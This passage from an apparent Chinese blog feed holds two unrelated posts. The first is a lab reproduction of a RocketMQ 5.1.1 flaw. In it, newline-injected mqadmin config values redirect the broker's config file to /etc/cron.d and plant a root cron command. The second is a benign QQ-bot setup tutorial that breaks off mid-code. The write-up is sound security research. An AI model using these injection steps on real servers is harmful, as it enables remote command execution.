<h2 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h2><p>Broker或者NameSrv等服务会监听端口，以RocketMQ协议通信（TCP + JSON），在相应服务的<code>processRequest</code>中下断点即可</p>
<blockquote>
<p>org.apache.rocketmq.broker.processor.AdminBrokerProcessor#processRequest<br>org.apache.rocketmq.namesrv.processor.DefaultRequestProcessor#processRequest<br>org.apache.rocketmq.container.BrokerContainerProcessor#processRequest</p>
</blockquote>
<h2 id="绕过方法一（攻击Broker）"><a href="#绕过方法一（攻击Broker）" class="headerlink" title="绕过方法一（攻击Broker）"></a>绕过方法一（攻击Broker）</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>dockerfile</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>u342-jdk</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt install vim netcat iputils-ping net-tools cron -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    wget https://archive.apache.org/dist/rocketmq/5.1.1/rocketmq-all-5.1.1-bin-release.zip &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    unzip rocketmq-all-5.1.1-bin-release.zip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /rocketmq-all-5.1.1-bin-release/bin/</span></span><br></pre></td></tr></table></figure>

<p>docker-compose.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">namesrv:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqnamesrv</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9876</span><span class="string">:9876</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">mqnamesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">broker:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqbroker</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10909</span><span class="string">:10909</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10911</span><span class="string">:10911</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10912</span><span class="string">:10912</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9555</span><span class="string">:9555</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT=-Xdebug</span> <span class="string">-Xrunjdwp:transport=dt_socket,address=9555,server=y,suspend=n</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">mqbroker</span> <span class="string">-n</span> <span class="string">namesrv:9876</span> <span class="string">-c</span> <span class="string">../conf/broker.conf</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">dashboard:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">apacherocketmq/rocketmq-dashboard</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqdashboard</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:8080</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">JAVA_OPTS:</span> <span class="string">&quot;-Drocketmq.namesrv.addr=namesrv:9876&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">test:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmq_test</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">tail</span> <span class="string">-f</span></span><br></pre></td></tr></table></figure>



<p>启动环境之后，需要手动在Broker机器上开启cron</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service cron start</span><br></pre></td></tr></table></figure>



<h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h3><p>有多种方式可以远程更新RocketMQ配置，最简单的是起一个RocketMQ的docker环境，利用其中的<a href="https://rocketmq.apache.org/zh/docs/deploymentOperations/02admintool">mqadmin</a>命令行工具</p>
<h4 id="更新其他配置，通过换行符注入自定义配置项"><a href="#更新其他配置，通过换行符注入自定义配置项" class="headerlink" title="更新其他配置，通过换行符注入自定义配置项"></a>更新其他配置，通过换行符注入自定义配置项</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./mqadmin updateBrokerConfig -k storePathRootDir -v <span class="string">&#x27;/tmp/store\nbrokerConfigPath=/etc/cron.d/test&#x27;</span> -b host.docker.internal:10911</span><br></pre></td></tr></table></figure>

<p>执行完这条命令后，远端Broker的<code>storePathRootDir</code>这项配置在内存中的值是<code>/tmp/store\nbrokerConfigPath=/etc/cron.d/test</code>，但同时这项配置也会被写入配置文件，在Broker这台机器上，配置文件<code>conf/broker.conf</code>内容将会如下：</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">...</span></span><br><span class="line"><span class="attr">storePathRootDir</span>=<span class="string">/tmp/store</span></span><br><span class="line"><span class="attr">brokerConfigPath</span>=<span class="string">/etc/cron.d/test</span></span><br><span class="line"><span class="attr">...</span></span><br></pre></td></tr></table></figure>



<h4 id="让远端Broker配置文件中的配置生效"><a href="#让远端Broker配置文件中的配置生效" class="headerlink" title="让远端Broker配置文件中的配置生效"></a>让远端Broker配置文件中的配置生效</h4><p>目前只是配置文件中的<code>brokerConfigPath</code>为指定的计划任务路径，其实并未被程序读取加载，让远端读取加载的方式可能存在多种，目前我只发现重启机器的方法（很鸡肋</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker restart rmqbroker</span><br></pre></td></tr></table></figure>

<p>容器中的cron不会自启动，还需要再次进入Broker容器手动启动cron</p>
<h4 id="在配置文件中写入计划任务"><a href="#在配置文件中写入计划任务" class="headerlink" title="在配置文件中写入计划任务"></a>在配置文件中写入计划任务</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./mqadmin updateBrokerConfig -k bindAddress -v <span class="string">&#x27;0.0.0.0\n* * * * * root touch /tmp/success&#x27;</span> -b host.docker.internal:10911</span><br></pre></td></tr></table></figure>

<p>此时Broker就会将配置写入<code>/etc/cron.d/test</code>文件</p>
<p>还需要将value为空的配置进行数据填充</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./mqadmin updateBrokerConfig -k controllerAddr -v 127.0.0.1 -b host.docker.internal:10911</span><br><span class="line">./mqadmin updateBrokerConfig -k messageStorePlugIn -v <span class="built_in">test</span> -b host.docker.internal:10911</span><br><span class="line">./mqadmin updateBrokerConfig -k metricsLabel -v <span class="built_in">test</span> -b host.docker.internal:10911</span><br><span class="line">./mqadmin updateBrokerConfig -k metricsGrpcExporterHeader -v <span class="built_in">test</span> -b host.docker.internal:10911</span><br><span class="line">./mqadmin updateBrokerConfig -k metricsGrpcExporterTarget -v <span class="built_in">test</span> -b host.docker.internal:10911</span><br><span class="line">./mqadmin updateBrokerConfig -k metricsPromExporterHost -v 127.0.0.1 -b host.docker.internal:10911</span><br></pre></td></tr></table></figure>

<blockquote>
<p>因为测试cron的时候遇到一个坑，当计划任务文件包含<code>key=空</code>的行时将不会执行，不知道其他版本或系统是否这样</p>
</blockquote>
<p>至多1分钟后，命令将被执行</p>
<h2 id="绕过方法二（攻击BrokerContainer）"><a href="#绕过方法二（攻击BrokerContainer）" class="headerlink" title="绕过方法二（攻击BrokerContainer）"></a>绕过方法二（攻击BrokerContainer）</h2><p>BrokerContainer介绍：<a href="https://github.com/apache/rocketmq/wiki/RIP-31-Support-RocketMQ-BrokerContainer">https://github.com/apache/rocketmq/wiki/RIP-31-Support-RocketMQ-BrokerContainer</a></p>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>docker-compose.yml 需要修改如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">namesrv:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqnamesrv</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9876</span><span class="string">:9876</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">mqnamesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">brokercontainer:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqbrokercontainer</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">6888</span><span class="string">:6888</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10811</span><span class="string">:10811</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9555</span><span class="string">:9555</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT=-Xdebug</span> <span class="string">-Xrunjdwp:transport=dt_socket,address=9555,server=y,suspend=n</span></span><br><span class="line">    <span class="attr">command:</span> </span><br><span class="line">        <span class="bullet">-</span> <span class="string">/bin/sh</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">          printf &quot;listenPort=10811\nnamesrvAddr=namesrv:9876\n&quot; &gt; broker-container.conf</span></span><br><span class="line"><span class="string">          sh mqbrokercontainer -c broker-container.conf</span></span><br><span class="line"><span class="string"></span>    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">dashboard:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">apacherocketmq/rocketmq-dashboard</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqdashboard</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:8080</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">JAVA_OPTS:</span> <span class="string">&quot;-Drocketmq.namesrv.addr=namesrv:9876&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">test:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmq_test</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">tail</span> <span class="string">-f</span></span><br></pre></td></tr></table></figure>



<p>启动环境之后，需要手动在BrokerContainer机器上开启cron</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service cron start</span><br></pre></td></tr></table></figure>





<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="创建配置文件路径为计划任务的Broker"><a href="#创建配置文件路径为计划任务的Broker" class="headerlink" title="创建配置文件路径为计划任务的Broker"></a>创建配置文件路径为计划任务的Broker</h4><p>测试环境中启动mqbrokercontainer的时候是没有指定<code>brokerConfigPaths</code>的，所以默认只有brokercontainer服务，没有具体Broker。可以用<code>./mqadmin addBroker</code>启动一个Broker</p>
<p>相关代码中存在如下逻辑：</p>
<p>org.apache.rocketmq.container.BrokerContainerProcessor#addBroker</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">configPath</span> <span class="operator">=</span> requestHeader.getConfigPath();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (configPath != <span class="literal">null</span> &amp;&amp; !configPath.isEmpty()) &#123;</span><br><span class="line">    BrokerStartup.<span class="type">SystemConfigFileHelper</span> <span class="variable">configFileHelper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BrokerStartup</span>.SystemConfigFileHelper();</span><br><span class="line">    configFileHelper.setFile(configPath);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        brokerProperties = configFileHelper.loadConfig();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        LOGGER.error(<span class="string">&quot;addBroker load config from &#123;&#125; failed, &#123;&#125;&quot;</span>, configPath, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] body = request.getBody();</span><br><span class="line">    <span class="keyword">if</span> (body != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">bodyStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(body, MixAll.DEFAULT_CHARSET);</span><br><span class="line">        brokerProperties = MixAll.string2Properties(bodyStr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果未指定<code>configPath</code>的话，将会从请求包中直接读取配置，然而<code>configPath</code>对于<code>mqadmin</code>的<code>addBroker</code>指令是必选项，而且无法自定义包体的内容</p>
<blockquote>
<p>usage: mqadmin addBroker -b <arg> -c <arg> [-h] [-n <arg>]<br>-b,–brokerConfigPath <arg>      Broker config path<br>-c,–brokerContainerAddr <arg>   Broker container address<br>-h,–help                        Print help<br>-n,–namesrvAddr <arg>           Name server address list, eg: ‘192.168.0.1:9876;192.168.0.2:9876’</p>
</blockquote>
<p>所以我们需要自己构造RocketMQ协议，或者直接修改<a href="https://github.com/apache/rocketmq/releases/tag/rocketmq-all-5.1.1">源码</a>进行调用，这里我采用了后者：</p>
<p>这条命令<code>./mqadmin addBroker -c host.docker.internal:10811 -b &#39;&#39;</code>其实也是调用Java，完整命令行参数如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/local/openjdk-8/bin/java -server -Xms1g -Xmx1g -Xmn256m -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=128m -<span class="built_in">cp</span> .:/rocketmq-all-5.1.1-bin-release/bin/../conf:/rocketmq-all-5.1.1-bin-release/bin/../lib/*: -Drmq.logback.configurationFile=/rocketmq-all-5.1.1-bin-release/conf/rmq.tools.logback.xml org.apache.rocketmq.tools.command.MQAdminStartup addBroker -c host.docker.internal:10811 -b   </span><br></pre></td></tr></table></figure>



<p>那么这样修改源码进行调用效果是一样的：</p>
<p>org.apache.rocketmq.tools.command.MQAdminStartup#main</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//main0(args, null);</span></span><br><span class="line">    main0(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;addBroker&quot;</span>, <span class="string">&quot;-c&quot;</span> ,<span class="string">&quot;127.0.0.1:10811&quot;</span>, <span class="string">&quot;-b&quot;</span>,<span class="string">&quot;&quot;</span>&#125;,<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>接着通过<code>request.setBody</code>添加包体：</p>
<p>org.apache.rocketmq.client.impl.MQClientAPIImpl#addBroker</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RemotingCommand</span> <span class="variable">request</span> <span class="operator">=</span> RemotingCommand.createRequestCommand(RequestCode.ADD_BROKER, requestHeader);</span><br><span class="line">request.setBody(</span><br><span class="line">        (<span class="string">&quot;brokerClusterName = DefaultCluster\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;brokerName = broker-a\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;brokerId = 0\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;deleteWhen = 04\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;fileReservedTime = 48\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;brokerRole = ASYNC_MASTER\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;flushDiskType = ASYNC_FLUSH\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;brokerConfigPath=/etc/cron.d/test\n&quot;</span>).getBytes());</span><br></pre></td></tr></table></figure>



<p>这样让远端BrokerContainer服务启动Broker成功后，默认端口是在6888，当然也可以在配置内容中指定端口</p>
<h4 id="触发配置文件写入"><a href="#触发配置文件写入" class="headerlink" title="触发配置文件写入"></a>触发配置文件写入</h4><p>目前配置都在内存中，再一次通过<code>mqadmin</code>注入配置就可以将配置文件导出到对应路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./mqadmin updateBrokerConfig -k storePathRootDir -v <span class="string">&#x27;/tmp/store\n* * * * * root touch /tmp/success&#x27;</span> -b host.docker.internal:6888</span><br></pre></td></tr></table></figure>





<p>还需要将value为空的配置进行数据填充</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./mqadmin updateBrokerConfig -k controllerAddr -v 127.0.0.1 -b host.docker.internal:6888</span><br><span class="line">./mqadmin updateBrokerConfig -k messageStorePlugIn -v <span class="built_in">test</span> -b host.docker.internal:6888</span><br><span class="line">./mqadmin updateBrokerConfig -k metricsLabel -v <span class="built_in">test</span> -b host.docker.internal:6888</span><br><span class="line">./mqadmin updateBrokerConfig -k metricsGrpcExporterHeader -v <span class="built_in">test</span> -b host.docker.internal:6888</span><br><span class="line">./mqadmin updateBrokerConfig -k metricsGrpcExporterTarget -v <span class="built_in">test</span> -b host.docker.internal:6888</span><br><span class="line">./mqadmin updateBrokerConfig -k metricsPromExporterHost -v 127.0.0.1 -b host.docker.internal:6888</span><br></pre></td></tr></table></figure>



<p>同样至多1分钟后，命令将被执行</p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
        <tag>RocketMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 定制QQ机器人</title>
    <url>/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
    <content><![CDATA[<p>前两天见有同学写QQ机器人用于每天代为疫情打卡，感觉是挺方便的，但有违学校规定，后被迫停止了，遂自己写了脚本挂服务器，然后感觉这个机器人挺有趣，小小研究了下</p>
<span id="more"></span>

<h2 id="安装-酷Q-on-Docker"><a href="#安装-酷Q-on-Docker" class="headerlink" title="安装 酷Q on Docker"></a>安装 酷Q on Docker</h2><p>酷Q原是Windows上的项目，不过官方基于Docker和Wine技术，也推出了酷Q Docker版</p>
<p>下载镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull coolq/wine-coolq</span><br></pre></td></tr></table></figure>

<p>下载后，在任意目录创建一个空文件夹，用于持久化存放 酷Q 数据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /root/coolq-data</span><br></pre></td></tr></table></figure>

<p>运行 酷Q 镜像，后面要登录的QQ帐号和VNC密码自行设置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name=coolq -d -p 8080:9000 -v /root/coolq-data:/home/user/coolq -e VNC_PASSWD=password -e COOLQ_ACCOUNT=username coolq/wine-coolq</span><br></pre></td></tr></table></figure>

<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416161425000.png" alt="image-20200416161425000"></p>
<p>访问vps服务所在端口，输入之前设置的密码</p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416161955305.png" alt="image-20200416161955305"></p>
<p>登录QQ小号，提示收到交互式网页验证码，但又看不见验证码，点拒绝，多尝试几次登录就OK了</p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416170240449.png" alt="image-20200416170240449"></p>
<h2 id="Python实现交互"><a href="#Python实现交互" class="headerlink" title="Python实现交互"></a>Python实现交互</h2><p>用到插件<a href="https://github.com/richardchien/coolq-http-api">coolq-http-api</a>，其通过 HTTP 或 WebSocket 对酷 Q 的事件进行上报以及接收请求来调用酷 Q 的 DLL 接口，从而可以使用其它语言编写酷 Q 插件。支持 Windows 7 和 Windows Server 2008 及更新版本，也可以运行在 Wine、Docker</p>
<p>还有<a href="https://github.com/cqmoe/python-cqhttp">CQHTTP Python SDK</a>，其为 CQHTTP 插件的 Python SDK，封装了 web server 相关的代码，让使用 Python 的开发者能方便地开发插件</p>
<h3 id="安装CoolQ-HTTP-API-插件"><a href="#安装CoolQ-HTTP-API-插件" class="headerlink" title="安装CoolQ HTTP API 插件"></a>安装CoolQ HTTP API 插件</h3><p>直接到 <a href="https://github.com/richardchien/coolq-http-api/releases">Releases</a> 下载最新的 cpk 文件放到 酷Q 的 app 文件夹</p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416171712785.png" alt="image-20200416171712785"></p>
<p>重载应用后启用CQHTTP</p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416171857757.png" alt="image-20200416171857757"></p>
<p>然后讲道理这里应该会有日志回显的，但是没有，不明原因</p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416172444861.png" alt="image-20200416172444861"></p>
<p>那么直接在宿主机测试该插件是否生效</p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416172633677.png" alt="image-20200416172633677"></p>
<p>发现5700端口的确开放，说明插件已经正在运行了，测试下发送消息的api，user_id为QQ号</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&quot;http://172.17.0.2:5700/send_private_msg?user_id=1729888211&amp;message=test&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416172746583.png" alt="image-20200416172746583"></p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416172827678.png" alt="image-20200416172827678"></p>
<p>能收到消息表明已经正常工作了</p>
<p>目前能用http -api发送消息，还需要接收酷Q收到的消息才行，配置文件在 酷Q 的 <code>data\app\io.github.richardchien.coolqhttpapi\config</code> 文件夹中，文件名为 <code>&lt;user_id&gt;.json</code>（<code>&lt;user_id&gt;</code>为登录的 QQ 号）</p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416174237085.png" alt="image-20200416174237085"></p>
<p>酷Q 收到的消息、事件会被 POST 到配置文件中指定的 <code>post_url</code>，为空则不上报</p>
<p>那么修改post_url，暂时我先设置为宿主机的内网ip，端口5701</p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416175344285.png" alt="image-20200416175344285"></p>
<p>重启下应用，宿主机监听5701端口，然后发给机器人一条消息</p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416175853466.png" alt="image-20200416175853466"></p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416175835683.png" alt="image-20200416175835683"></p>
<p>5701端口收到POST传递过来的消息即说明功能正常</p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416180327359.png" alt="image-20200416180327359"></p>
<h3 id="CQHTTP-Python-SDK"><a href="#CQHTTP-Python-SDK" class="headerlink" title="CQHTTP Python SDK"></a>CQHTTP Python SDK</h3><p>我打算也安装在Docker中</p>
<p><del>下载Python镜像</del></p>
<p>~~docker pull python~~~</p>
<p>突然想起来 酷Q on Docker 中就有Python环境，那还是放在一起好了</p>
<p>进入VNC右键桌面打开控制台</p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416181040447.png" alt="image-20200416181040447"></p>
<p>安装pip先</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br><span class="line">python3 get-pip.py</span><br></pre></td></tr></table></figure>

<p>emm，报错</p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416181945872.png" alt="image-20200416181945872"></p>
<p>解决方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install python3-distutils</span><br></pre></td></tr></table></figure>

<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416182110121.png" alt="image-20200416182110121"></p>
<p>提示权限不够，可我也不知root的密码，那在宿主机进入docker并修改密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -ti d6c bash</span><br><span class="line">passwd</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416182416295.png" alt="image-20200416182416295"></p>
<p>进入VNC切换为root用户并安装python3-distutils，然后就可以安装pip了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su root</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install python3-distutils</span><br><span class="line">python3 get-pip.py</span><br></pre></td></tr></table></figure>

<p>接着直接用pip安装<code>cqhttp</code> 包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m pip install cqhttp</span><br></pre></td></tr></table></figure>



<p>然后新建 Python 文件，运行 bot</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> cqhttp <span class="keyword">import</span> CQHttp</span><br><span class="line"></span><br><span class="line">bot = CQHttp(api_root=<span class="string">&#x27;http://127.0.0.1:5700/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@bot.on_message</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_msg</span>(<span class="params">event</span>):</span><br><span class="line">    bot.send(event, <span class="string">&#x27;你好呀，下面一条是你刚刚发的：&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;reply&#x27;</span>: event[<span class="string">&#x27;message&#x27;</span>], <span class="string">&#x27;at_sender&#x27;</span>: <span class="literal">False</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@bot.on_notice(<span class="params"><span class="string">&#x27;group_increase&#x27;</span></span>)  </span><span class="comment"># 如果插件版本是 3.x，这里需要使用 @bot.on_event</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_group_increase</span>(<span class="params">event</span>):</span><br><span class="line">    bot.send(event, message=<span class="string">&#x27;欢迎新人～&#x27;</span>, auto_escape=<span class="literal">True</span>)  <span class="comment"># 发送欢迎新人</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@bot.on_request(<span class="params"><span class="string">&#x27;group&#x27;</span>, <span class="string">&#x27;friend&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_request</span>(<span class="params">event</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;approve&#x27;</span>: <span class="literal">True</span>&#125;  <span class="comment"># 